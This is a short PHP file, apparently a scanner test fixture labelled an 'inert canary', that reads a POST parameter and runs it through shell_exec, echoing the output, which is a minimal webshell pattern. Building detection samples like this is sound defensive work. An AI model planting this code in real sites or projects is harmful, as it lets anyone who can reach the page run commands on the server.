<?php
// INERT CANARY: request input stored in a variable, then executed (real webshells in malcontent-samples)
if (isset($_POST['canary'])) {
    $cmd = $_POST['canary'];
    echo shell_exec($cmd);
}
